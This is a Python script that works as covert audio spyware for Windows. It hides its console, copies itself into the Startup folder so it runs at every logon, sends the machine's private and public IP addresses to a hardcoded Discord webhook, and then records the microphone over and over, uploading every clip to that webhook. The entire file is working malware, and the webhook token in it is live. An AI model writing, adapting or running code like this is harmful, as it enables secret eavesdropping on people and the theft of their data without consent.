import socket
import http.client
import json
from urllib.parse import urlparse
import sounddevice as sd
import numpy as np
import wave
import requests
import time
import multiprocessing
import os
import ctypes
import sys

WEBHOOK_URL = "https://discord.com/api/webhooks/1381400948374769824/JOPqOy6uWLHvMwOgq1MtyE-gqui8pDouWw02Jfbo5hFWobuiNpl8-8S2SYWcfLzdKafQ"
DURATION = 5  # seconds
SAMPLERATE = 44100

def add_to_startup():
    # Only for Windows
    if os.name != "nt":
        return

    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    shortcut_path = os.path.join(startup_dir, 'MyRecorderStartupShortcut.lnk')

    if os.path.exists(shortcut_path):
        return  # Shortcut already exists

    try:
        import pythoncom
        from win32com.shell import shell, shellcon

        script_path = os.path.abspath(sys.argv[0])

        shell_link = pythoncom.CoCreateInstance(
            shell.CLSID_ShellLink, None,
            pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink)
        shell_link.SetPath(sys.executable)  # python.exe path
        shell_link.SetArguments(f'"{script_path}"')
        shell_link.SetWorkingDirectory(os.path.dirname(script_path))

        persist_file = shell_link.QueryInterface(pythoncom.IID_IPersistFile)
        persist_file.Save(shortcut_path, 0)

        print(f"Startup shortcut created at: {shortcut_path}")
    except ImportError:
        print("pywin32 is required to create startup shortcut. Run: pip install pywin32")
    except Exception as e:
        print(f"Failed to create startup shortcut: {e}")

def get_private_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        return f"Error getting private IP: {e}"

def get_public_ip():
    try:
        conn = http.client.HTTPSConnection("api.ipify.org")
        conn.request("GET", "/?format=json")
        response = conn.getresponse()
        if response.status == 200:
            data = response.read()
            json_data = json.loads(data)
            return json_data.get("ip")
        else:
            return f"Error getting public IP: HTTP {response.status}"
    except Exception as e:
        return f"Error getting public IP: {e}"

def send_to_discord(content):
    parsed_url = urlparse(WEBHOOK_URL)
    conn = http.client.HTTPSConnection(parsed_url.netloc)

    headers = {
        "Content-Type": "application/json"
    }

    payload = json.dumps({"content": content})
    conn.request("POST", parsed_url.path, body=payload, headers=headers)
    response = conn.getresponse()
    response.read()  # free connection
    conn.close()

    if response.status == 204:
        print("✅ Sent to Discord successfully!")
    else:
        print(f"❌ Failed to send: HTTP {response.status}")

def hide_console():
    if os.name == "nt":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def record_audio(filename="audio_recording.wav"):
    audio = sd.rec(int(SAMPLERATE * DURATION), samplerate=SAMPLERATE, channels=1, dtype=np.int16)
    sd.wait()
    with wave.open(filename, "wb") as wf:
        wf.setnchannels(1)
        wf.setsampwidth(2)
        wf.setframerate(SAMPLERATE)
        wf.writeframes(audio.tobytes())
    return filename

def send_audio_to_webhook(filename):
    with open(filename, "rb") as f:
        files = {"file": f}
        response = requests.post(WEBHOOK_URL, files=files)
    if response.status_code == 200:
        print("Audio sent successfully!")
    else:
        print(f"Failed to send audio: {response.status_code}")

def run_background():
    hide_console()
    while True:
        audio_file = record_audio()
        send_audio_to_webhook(audio_file)
        time.sleep(DURATION)

if __name__ == "__main__":
    add_to_startup()  # <-- create startup shortcut on first run

    # Send IP addresses first
    private_ip = get_private_ip()
    public_ip = get_public_ip()
    send_to_discord(f"📡 Private IP Address: `{private_ip}`")
    send_to_discord(f"🌐 Public IP Address: `{public_ip}`")

    # Start audio recording in background
    process = multiprocessing.Process(target=run_background)
    process.daemon = True
    process.start()

    # Keep main alive so process keeps running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Exiting...")
